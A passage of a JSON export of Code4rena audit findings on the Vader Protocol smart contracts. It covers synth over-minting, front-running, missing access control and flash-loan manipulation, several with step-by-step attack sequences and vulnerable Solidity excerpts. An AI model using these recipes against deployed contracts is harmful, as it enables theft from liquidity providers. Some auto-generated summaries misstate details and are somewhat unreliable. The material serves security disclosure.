      "content": "_Submitted by WatchPug_\n\nPer the document:\n\n> It also is capable of using liquidity units as collateral for synthetic assets, of which it will always have guaranteed redemption liquidity for.\n\nHowever, in the current implementation, `Synth` tokens are minted based on the calculation result. While `nativeDeposit` be added to the reserve, `reserveForeign` will remain unchanged, not deducted nor locked.\n\nMaking it possible for `Synth` tokens to get over-minted.\n\n##### Proof of Concept\n\n*   The Vader pool for BTC-USDV is newly created, with nearly 0 liquidity.\n\n1.  Alice add liquidity with `100,000 USDV` and `1 BTC`;\n2.  Bob `mintSynth()` with `100,000 USDV`, got `0.25 BTC vSynth`;\n3.  Alice remove all the liquidity received at step 1, got all the `200k USDV` and `1 BTC`.\n\nThe `0.25 BTC vSynth` held by Bob is now backed by nothing and unable to be redeemed.\n\nThis also makes it possible for a sophisticated attacker to steal funds from the Vader pool.\n\nThe attacker may do the following in one transaction:\n\n1.  Add liquidity with `10 USDV` and `10,000 BTC` (flash loan);\n2.  Call `mintSynth()` with `10 USDV`, repeat for 10 times, got `1461 BTC vSynth`;\n3.  Remove liquidity and repay flash loan, keep the `1461 BTC vSynth`;\n4.  Wait for other users to add liquidity and when the BTC reserve is sufficient, call `burnSynth()` to steal `USDV` from the pool.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/210)**\n> Given that the codebase attempts to implement the Thorchain rust code in a one-to-one fashion, findings that relate to the mathematical accuracy of the codebase will only be accepted in one of the following cases:\n> - The code deviates from the Thorchain implementation\n> - A test case is created that illustrates the problem\n\n>While intuition is a valid ground for novel implementations, we have re-implemented a battle-tested implementation in another language and as such it is considered secure by design unless proven otherwise. \n\n",
      "summary": "\nThe report highlights a bug in the current implementation of a system that allows users to use liquidity units as collateral for synthetic assets. The bug allows for the over-minting of synthetic tokens, which could result in loss of funds or theft from the system. The issue was confirmed by the developer and will be addressed if it deviates from the original code or if a test case is created to illustrate the problem.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/210",
      "tags": [],
      "finders": []
    },
    {
      "id": "42342",
      "title": "[H-22] `mintSynth()` and `burnSynth()` can be front run",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n- <https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L155>\n\n- <https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L179-L197>\n\nGiven that `mintSynth()` and `burnSynth()` will issue and redeem assets based on the price of the pool (reserves), and they will create price impact based on the volume being minted and burnt.\n\nHowever, the current implementation provides no parameter for slippage control, making them vulnerable to front-run attacks. Especially for transactions with rather large volumes.\n\n##### Recommendation\n\nConsider adding a `minAmountOut` parameter.\n\n",
      "summary": "\nThis bug report discusses an issue with the `mintSynth()` and `burnSynth()` functions in the `VaderPoolV2.sol` smart contract. These functions are used to issue and redeem assets based on the price of the pool's reserves. However, the current implementation does not include a parameter for controlling slippage, which makes the functions vulnerable to front-run attacks, especially for large volume transactions. The recommendation is to add a `minAmountOut` parameter to address this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/209",
      "tags": [],
      "finders": []
    },
    {
      "id": "42341",
      "title": "[H-21] Lack of access control allow attacker to `mintFungible()` and `mintSynth()` with other user's wallet balance",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335>\n\n```solidity\nfunction mintFungible(\n        IERC20 foreignAsset,\n        uint256 nativeDeposit,\n        uint256 foreignDeposit,\n        address from,\n        address to\n    ) external override nonReentrant returns (uint256 liquidity) {\n        IERC20Extended lp = wrapper.tokens(foreignAsset);\n\n        require(\n            lp != IERC20Extended(_ZERO_ADDRESS),\n            \"VaderPoolV2::mintFungible: Unsupported Token\"\n        );\n\n        (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(\n            foreignAsset\n        ); // gas savings\n\n        nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);\n        foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);\n\n        PairInfo storage pair = pairInfo[foreignAsset];\n        uint256 totalLiquidityUnits = pair.totalSupply;\n        if (totalLiquidityUnits == 0) liquidity = nativeDeposit;\n        else\n            liquidity = VaderMath.calculateLiquidityUnits(\n                nativeDeposit,\n                reserveNative,\n                foreignDeposit,\n                reserveForeign,\n                totalLiquidityUnits\n            );\n\n        require(\n            liquidity > 0,\n            \"VaderPoolV2::mintFungible: Insufficient Liquidity Provided\"\n        );\n\n        pair.totalSupply = totalLiquidityUnits + liquidity;\n\n        _update(\n            foreignAsset,\n            reserveNative + nativeDeposit,\n            reserveForeign + foreignDeposit,\n            reserveNative,\n            reserveForeign\n        );\n\n        lp.mint(to, liquidity);\n\n        emit Mint(from, to, nativeDeposit, foreignDeposit);\n    }\n```\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167>\n\nFunds are transferred from the `from` parameter, and the output tokens are transferred to the `to` parameter, both passed by the caller without proper access control.\n\n##### Impact\n\nThis issue allows anyone to call `mintFungible()` and `mintSynth()` and steal almost all their wallet balances for all the users who have approved the contract before.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/204#issuecomment-979177088):**\n > Duplicate #67\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/204#issuecomment-991036185):**\n > Not a duplicate.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/204#issuecomment-995713007):**\n > @alcueca Can you elaborate as to why it is not a duplicate?\n>\n\n\n\n",
      "summary": "\nThe bug report is about an issue in the code for a decentralized exchange called VaderPoolV2. The issue allows anyone to call two functions, `mintFungible()` and `mintSynth()`, and steal almost all the wallet balances for all the users who have approved the contract before. This means that an attacker could potentially steal a large amount of funds from users of the exchange. The code also does not have proper access control, meaning that anyone can transfer funds from the `from` parameter and receive output tokens in the `to` parameter. This could lead to further exploitation of the contract. The report has been marked as not a duplicate by the judge, but there is no further explanation given.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/204",
      "tags": [],
      "finders": []
    },
    {
      "id": "42340",
      "title": "[H-20] Early user can break `addLiquidity`",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/pool/BasePool.sol#L161-L163>\n\n```solidity\nuint256 totalLiquidityUnits = totalSupply;\nif (totalLiquidityUnits == 0)\n    liquidity = nativeDeposit; // TODO: Contact ThorChain on proper approach\n```\n\nIn the current implementation, the first `liquidity` takes the `nativeDeposit` amount and uses it directly.\n\nHowever, since this number (`totalLiquidityUnits`) will later be used for computing the `liquidity` issued for future `addLiquidity` using `calculateLiquidityUnits`.\n\nA malicious user can add liquidity with only `1 wei` USDV and making it nearly impossible for future users to add liquidity to the pool.\n\n##### Recommendation\n\nUni v2 solved this problem by sending the first 1000 tokens to the zero address.\n\nThe same should work here, i.e., on first mint (totalLiquidityUnits == 0), lock some of the first minter's tokens by minting \\~1% of the initial amount to the zero address instead of to the first minter.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/189#issuecomment-979172790):**\n > Duplicate of #24\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/189#issuecomment-991467149):**\n > Not a duplicate\n\n\n\n",
      "summary": "\nThis bug report is about an issue in the code for a project called Vader. The code in question is used for managing a pool of assets. The problem is that the first user to add liquidity to the pool can manipulate the system by only depositing a tiny amount of one type of asset. This makes it difficult for future users to add liquidity to the pool. The report suggests a solution used by another project called Uni v2, where a small amount of the first user's tokens are locked and not used for liquidity. This would prevent the manipulation and make it fair for all users. The report has been marked as a duplicate of another report, but a judge has commented that it is not a duplicate. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/189",
      "tags": [],
      "finders": []
    },
    {
      "id": "42339",
      "title": "[H-18] Attacker can claim more IL by manipulating pool price then `removeLiquidity`",
      "impact": "HIGH",
      "content": "_Submitted by gzeon_\n\n#### Impact\n\nVader reimburse user IL immediately when user withdraw from the pool (VaderRouterV2.sol:L227), an attacker can therefore manipulate the pool balance causing a high IL, remove liquidity and restore the pool balance such that he will receive a larger IL reimbursement.\n\n#### Proof of Concept\n\nLet's assume our attacker own 100% of FOO-VADER\n\n1.  Attacker add 100 FOO and 100 VADER to the Pool\n2.  wait some block, or 1 year for max IL protection\n3.  In 1 transaction, attacker\n    *   Swap 9900 FOO to 99 Vader\n    *   Pool now have 10000 FOO and 1 VADER\n    *   By VaderMath.sol:L84 the loss is 100\\*1/10000+100-2 = 98.01 VADER\n    *   Remove liquidity and receive 10000 FOO and 99.01 VADER\n    *   Restore the pool balance\n4.  Such that the attacker will gain 98.01 VADER without risk\n\nThe profit is constrained by gas cost, pool fee, % of pool controlled by the attacker and % of IL protection.\n\n#### Recommended Mitigation Steps\n\nUse twap price to determine P1 in VaderMath.sol:L84 when calculating IL to reduce risk of manipulation\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/182#issuecomment-979171731):**\n > Duplicate of #2\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/182#issuecomment-991043223):**\n > Doesn't seem like a duplicate to me, @SamSteinGG?\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/182#issuecomment-995720224):**\n > @alcueca The stated trade cannot occur as trades are inherently limited by the CLP design of the protocol to one third of the available pair liquidity. As such, the illustrated pair would actually result in almost zero units retrieved back.\n>\n\n\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the Vader protocol that allows an attacker to manipulate the pool balance and receive a larger reimbursement for impermanent loss (IL). The attacker can do this by adding 100 FOO and 100 VADER to the pool, waiting for a certain period of time, and then swapping 9900 FOO for 99 VADER. They can then remove liquidity and restore the pool balance, resulting in a gain of 98.01 VADER without any risk. To mitigate this issue, it is recommended to use a twap price when calculating IL to reduce the risk of manipulation. There is some discussion in the comments about whether this is a duplicate report, but it is ultimately determined to be a unique issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/182",
      "tags": [],
      "finders": []
    },
    {
      "id": "42338",
      "title": "[H-16] `VaderRouter.calculateOutGivenIn` calculates wrong swap",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe 3-path hop in `VaderRouter.calculateOutGivenIn` is supposed to first swap **foreign** assets to native assets **in pool0**, and then the received native assets to different foreign assets again **in pool1**.\n\nThe first argument of `VaderMath.calculateSwap(amountIn, reserveIn, reserveOut)` must refer to the same token as the second argument `reserveIn`.\nThe code however mixes these positions up and first performs a swap in `pool1` instead of `pool0`:\n\n```solidity\nfunction calculateOutGivenIn(uint256 amountIn, address[] calldata path)\n    external\n    view\n    returns (uint256 amountOut)\n{\n  if(...) {\n  } else {\n    return\n        VaderMath.calculateSwap(\n            VaderMath.calculateSwap(\n                // @audit the inner trade should not be in pool1 for a forward swap. amountIn foreign => next param should be foreignReserve0\n                amountIn,\n                nativeReserve1,\n                foreignReserve1\n            ),\n            foreignReserve0,\n            nativeReserve0\n        );\n  }\n\n /** @audit instead should first be trading in pool0!\n    VaderMath.calculateSwap(\n        VaderMath.calculateSwap(\n            amountIn,\n            foreignReserve0,\n            nativeReserve0\n        ),\n        nativeReserve1,\n        foreignReserve1\n    );\n  */\n```\n\n#### Impact\n\nAll 3-path swaps computations through `VaderRouter.calculateOutGivenIn` will return the wrong result.\nSmart contracts or off-chain scripts/frontends that rely on this value to trade will have their transaction reverted, or in the worst case lose funds.\n\n#### Recommended Mitigation Steps\n\nReturn the following code instead which first trades in `pool0` and then in `pool1`:\n\n```solidity\nreturn\n  VaderMath.calculateSwap(\n      VaderMath.calculateSwap(\n          amountIn,\n          foreignReserve0,\n          nativeReserve0\n      ),\n      nativeReserve1,\n      foreignReserve1\n  );\n```\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/162)**\n\n",
      "summary": "\nThe bug report discusses an issue with the `VaderRouter.calculateOutGivenIn` function. This function is supposed to swap foreign assets to native assets in pool0 and then swap the received native assets to different foreign assets in pool1. However, the code is mixing up the positions and first performing a swap in pool1 instead of pool0. This means that all 3-path swaps made through this function will return the wrong result, potentially causing transactions to be reverted or funds to be lost. The recommended solution is to return a different code that first trades in pool0 and then in pool1. The Vader team has confirmed this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/162",
      "tags": [],
      "finders": []
    },
    {
      "id": "42337",
      "title": "[H-15] `VaderRouter._swap` performs wrong swap",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe 3-path hop in `VaderRouter._swap` is supposed to first swap **foreign** assets to native assets, and then the received native assets to different foreign assets again.\n\nThe `pool.swap(nativeAmountIn, foreignAmountIn)` accepts the foreign amount as the **second** argument.\nThe code however mixes these positional arguments up and tries to perform a `pool0` foreign -> native swap by using the **foreign** amount as the **native amount**:\n\n```solidity\nfunction _swap(\n    uint256 amountIn,\n    address[] calldata path,\n    address to\n) private returns (uint256 amountOut) {\n    if (path.length == 3) {\n      // ...\n      // @audit calls this with nativeAmountIn = amountIn. but should be foreignAmountIn (second arg)\n      return pool1.swap(0, pool0.swap(amountIn, 0, address(pool1)), to);\n    }\n}\n\n// @audit should be this instead\nreturn pool1.swap(pool0.swap(0, amountIn, address(pool1)), 0, to);\n```\n\n#### Impact\n\nAll 3-path swaps through the `VaderRouter` fail in the pool check when `require(nativeAmountIn = amountIn <= nativeBalance - nativeReserve = 0)` is checked, as foreign amount is sent but *native* amount is specified.\n\n#### Recommended Mitigation Steps\n\nUse `return pool1.swap(pool0.swap(0, amountIn, address(pool1)), 0, to);` instead.\n\n**[SamSteinGG (sponsor) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/161)** \n\n",
      "summary": "\nThe report discusses a bug found in the `VaderRouter._swap` function submitted by user cmichel. The function is supposed to swap foreign assets to native assets and then native assets to different foreign assets. However, the code is mixing up the positional arguments and trying to perform a foreign to native swap using the foreign amount as the native amount. This results in all 3-path swaps through the `VaderRouter` failing and causing issues with the pool check. The recommended mitigation step is to use a different code instead.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/161",
      "tags": [],
      "finders": []
    },
    {
      "id": "42336",
      "title": "[H-14] Anyone Can Arbitrarily Mint Fungible Tokens In `VaderPoolV2.mintFungible()`",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `mintFungible()` function is callable by any user that wishes to mint liquidity pool fungible tokens. The protocol expects a user to first approve the contract as a spender before calling `mintFungible()`. However, any arbitrary user could monitor the blockchain for contract approvals that match `VaderPoolV2.sol` and effectively frontrun their call to `mintFungible()` by setting the `to` argument to their own address. As a result, the `nativeDeposit` and `foreignDeposit` amounts are transferred from the victim, and LP tokens are minted and finally transferred to the malicious user who is represented by the `to` address.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335>\n\n#### Tools Used\n\nManual code review.\nDiscussions with dev.\n\n#### Recommended Mitigation Steps\n\nConsider removing the `from` argument in `mintFungible()` and update the `safeTransferFrom()` calls to instead transfer from `msg.sender`.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/147#issuecomment-979165275):**\n > The pool contracts, similarly to Uniswap V2, are never meant to be interacted with directly.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/147#issuecomment-991477978):**\n > You need to enforce that somehow.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/147#issuecomment-995730174):**\n > Upon second consideration, the functions relating to the minting of synths and wrapped tokens should have had the onlyRouter modifier and thus are indeed vulnerable. Issue accepted.\n>\n\n\n\n",
      "summary": "\nThe `mintFungible()` function in the VaderPoolV2.sol contract allows any user to mint liquidity pool fungible tokens without first being approved as a spender. This can be exploited by a malicious user who can frontrun the transaction and transfer funds to their own address instead of the intended recipient. This bug was discovered through manual code review and discussions with the developer. To fix this issue, it is recommended to remove the `from` argument in `mintFungible()` and update the `safeTransferFrom()` calls to transfer from `msg.sender` instead. The developer initially disputed the issue, stating that the pool contracts are not meant to be interacted with directly, but later confirmed that the functions related to minting are indeed vulnerable.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/147",
      "tags": [],
      "finders": []
    },
    {
      "id": "42335",
      "title": "[H-13] Anyone Can Arbitrarily Mint Synthetic Assets In `VaderPoolV2.mintSynth()`",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `mintSynth()` function is callable by any user and creates a synthetic asset against `foreignAsset` if it does not already exist. The protocol expects a user to first approve the contract as a spender before calling `mintSynth()`. However, any arbitrary user could monitor the blockchain for contract approvals that match `VaderPoolV2.sol` and effectively frontrun their call to `mintSynth()` by setting the `to` argument to their own address. As a result, the `nativeDeposit` amount is transferred from the victim, and a synthetic asset is minted and finally transferred to the malicious user who is represented by the `to` address.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167>\n\n#### Tools Used\n\nManual code review.\nDiscussions with dev.\n\n#### Recommended Mitigation Steps\n\nConsider removing the `from` argument in `mintSynth()` and update the `safeTransferFrom()` call to instead transfer from `msg.sender`.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/146#issuecomment-979164782):**\n >  The pool contracts, similarly to Uniswap V2, are never meant to be interacted with directly.\n\n\n\n",
      "summary": "\nThe report discusses a bug in the `mintSynth()` function of the VaderPoolV2 contract. This function can be called by any user and creates a synthetic asset against a foreign asset. The problem is that a user can bypass the expected approval process and frontrun their call to `mintSynth()` by setting the `to` argument to their own address. This allows them to transfer the victim's native deposit and receive the synthetic asset. The bug was identified through manual code review and discussions with the developer. The suggested mitigation step is to remove the `from` argument and update the `safeTransferFrom()` call to transfer from `msg.sender` instead.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/146",
      "tags": [],
      "finders": []
    },
    {
      "id": "42334",
      "title": "[H-04] TwapOracle doesn't calculate VADER:USDV exchange rate correctly",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nDetailed description of the impact of this finding.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L156>\n\nOn L156 of `TwapOracle` we perform the calculation:\n\n    result = ((sumUSD * IERC20Metadata(token).decimals()) / sumNative);\n\nThis seems extremely odd as for an 18 decimal token we're then calculating\n\n    result = ((sumUSD * 18) / sumNative);\n\nThis is just plain weird. I expect what was meant is to replace this line with the below so we're properly scaling for `token`'s number of decimals.\n\n    uint256 scalingFactor = 10 ** IERC20Metadata(token).decimals()\n    result = (sumUSD * scalingFactor) / sumNative;\n\nMarked as high severity as this exchange rate appears to be used in [some form of minting mechanism](https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/tokens/Vader.sol#L18-L19) and correctness of the oracle is listed as one of the key focuses of the audit.\n\n#### Recommended Mitigation Steps\n\nAs above.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/19)**\n> The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nThis bug report, submitted by TomFrenchBlockchain, discusses an issue found in the code for the Vader project. The impact of this finding is described in detail, and a proof of concept is provided to show where the issue is located in the code. The bug appears to be in the calculation for the exchange rate, as it is not properly accounting for the number of decimals in the token. This is marked as a high severity issue, as the exchange rate is used in a minting mechanism and the correctness of the oracle is important for the project. The recommended mitigation steps for this bug are to replace the incorrect line of code with the correct one. The project lead, SamSteinGG, has confirmed the issue and stated that the TWAP oracle module has been removed and redesigned from scratch for the new audit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/19",
      "tags": [],
      "finders": []
    },
    {
      "id": "42333",
      "title": "[H-02] Redemption value of synths can be manipulated to drain `VaderPool` of all native assets",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nDraining of funds from `VaderPool`\n\n#### Proof of Concept\n\nSee the `VaderPool.mintSynth` function:\n<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167>\n\nAs the pool's reserves can be manipulated through flashloans similar to on UniswapV2, an attacker may set the exchange rate between `nativeAsset` and synths (calculated from the reserves). An attacker can exploit this to drain funds from the pool.\n\n1.  The attacker first flashloans and sells a huge amount of `foreignAsset` to the pool. The pool now thinks `nativeAsset` is extremely valuable.\n2.  The attacker now uses a relatively small amount of `nativeAsset` to mint synths using `VaderPool.mintSynth`. As the pool thinks `nativeAsset` is very valuable the attacker will receive a huge amount of synths.\n3.  The attacker can now manipulate the pool in the opposite direction by buying up the `foreignAsset` they sold to the pool. `nativeAsset` is now back at its normal price, or perhaps artificially low if the attacker wishes.\n4.  The attacker now burns all of their synths. As `nativeAsset` is considered much less valuable than at the point the synths were minted it takes a lot more of `nativeAsset` in order to pay out for the burned synths.\n\nFor the price of a flashloan and some swap fees, the attacker has now managed to extract a large amount of `nativeAsset` from the pool. This process can be repeated as long as it is profitable.\n\n#### Recommended Mitigation Steps\n\nPrevent minting of synths or at the very least tie the exchange rate to a manipulation resistant oracle.\n\n\n",
      "summary": "\nThis report was submitted by TomFrenchBlockchain and it highlights a bug that can lead to the draining of funds from `VaderPool`. The bug can be exploited by manipulating the pool's reserves through flashloans, similar to how it can be done on UniswapV2. The attacker can do this by manipulating the exchange rate between `nativeAsset` and synths, causing the pool to think that `nativeAsset` is extremely valuable. The attacker can then use a small amount of `nativeAsset` to mint a large amount of synths and manipulate the pool in the opposite direction, buying back the `foreignAsset` they sold to the pool. This process can be repeated as long as it remains profitable for the attacker. To prevent this bug, it is recommended to either prevent the minting of synths or tie the exchange rate to a manipulation-resistant oracle.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/3",
      "tags": [],
      "finders": []
    },
    {
      "id": "5245",
      "title": "[H-05] LPs of VaderPoolV2 can manipulate pool reserves to extract funds from the reserve.",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain, also found by WatchPug_\n\n#### Impact\n\nImpermanent loss protection can be exploited to drain the reserve.\n\n#### Proof of Concept\n\nIn `VaderPoolV2.burn` we calculate the current losses that the LP has made to impermanent loss.\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/pool/VaderPoolV2.sol#L237-L269>\n\nThese losses are then refunded to the LP in VADER tokens from the reserve\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex-v2/router/VaderRouterV2.sol#L208-L227>\n\nThis loss is calculated by the current reserves of the pool so if an LP can manipulate the pool's reserves they can artificially engineer a huge amount of IL in order to qualify for a payout up to the size of their LP position.\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/dex/math/VaderMath.sol#L73-L93>\n\nThe attack is then as follows.\n\n1.  Be an LP for a reasonable period of time (IL protection scales linearly up to 100% after a year)\n2.  Flashloan a huge amount of one of the pool's assets.\n3.  Trade against the pool with the flashloaned funds to unbalance it such that your LP position has huge IL.\n4.  Remove your liquidity and receive compensation from the reserve for the IL you have engineered.\n5.  Re-add your liquidity back to the pool.\n6.  Trade against the pool to bring it back into balance.\n\nThe attacker now holds the majority of their flashloaned funds (minus slippage/swap fees) along with a large fraction of the value of their LP position in VADER paid out from the reserve. The value of their LP position is unchanged. Given a large enough LP position, the IL protection funds extracted from the reserve will exceed the funds lost to swap fees and the attacker will be able to repay their flashloan with a profit.\n\nThis is a high risk issue as after a year any large LP is incentivised and able to perform this attack.\n\n#### Recommended Mitigation Steps\n\nUse a manipulation resistant oracle for the relative prices of the pool's assets (TWAP, etc.)\n\n",
      "summary": "\nThis bug report details a vulnerability in the \"VaderPoolV2.burn\" code, which allows an LP (liquidity provider) to exploit the impermanent loss protection feature to drain the reserve. By manipulating the pool's reserves, an LP can artificially create a huge amount of impermanent loss and receive compensation from the reserve for it. The attack involves the LP being an LP for a reasonable period of time, flashloaning a huge amount of one of the pool's assets, trading against the pool to unbalance it, removing their liquidity, receiving compensation from the reserve, and then re-adding their liquidity back to the pool. After a year, any large LP is incentivised and able to perform this attack. To mitigate this issue, a manipulation-resistant oracle should be used for the relative prices of the pool's assets.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/31",
      "tags": [],
      "finders": [
        "WatchPug",
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "4162",
      "title": "[H-29] VaderPoolV2.mintFungible exposes users to unlimited slippage",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nFrontrunners can extract up to 100% of the value provided by LPs to VaderPoolV2.\n\n#### Proof of Concept\n\nUsers can provide liquidity to `VaderPoolV2` through the `mintFungible` function.\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L271-L335>\n\nThis allows users to provide tokens in any ratio and the pool will calculate what fraction of the value in the pool this makes up and mint the corresponding amount of liquidity units as an ERC20.\n\nHowever there's no way for users to specify the minimum number of liquidity units they will accept. As the number of liquidity units minted is calculated from the current reserves, this allows frontrunners to manipulate the pool's reserves in such a way that the LP receives fewer liquidity units than they should. e.g. LP provides a lot of `nativeAsset` but very little `foreignAsset`, the frontrunner can then sell a lot of `nativeAsset` to the pool to devalue it.\n\nOnce this is done the attacker returns the pool's reserves back to normal and pockets a fraction of the value which the LP meant to provide as liqudity.\n\n#### Recommended Mitigation Steps\n\nAdd a user-specified minimum amount of LP tokens to mint.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/248)**\n>Given that the codebase attempts to implement the Thorchain rust code in a one-to-one fashion, findings that relate to the mathematical accuracy of the codebase will only be accepted in one of the following cases:\n> - The code deviates from the Thorchain implementation\n> - A test case is created that illustrates the problem\n\n>While intuition is a valid ground for novel implementations, we have re-implemented a battle-tested implementation in another language and as such it is considered secure by design unless proven otherwise.\n\n>An additional note on this point is that any behaviour that the Thorchain model applies is expected to be the intended design in our protocol as well.\n\n> An important example is the slippage a user incurs on joining a particular LP pool for which there is no check as there can't be any. Enforcing an LP unit based check here is meaningless given that LP units represent a share that greatly fluctuates (1 unit of LP out of 100 units is different than 1 out of 1000, however, a slippage check for 100 units of DAI for example is valid).\n\n",
